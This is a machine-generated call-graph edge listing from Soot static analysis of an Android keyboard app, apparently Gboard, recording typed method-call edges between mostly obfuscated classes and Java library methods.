VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
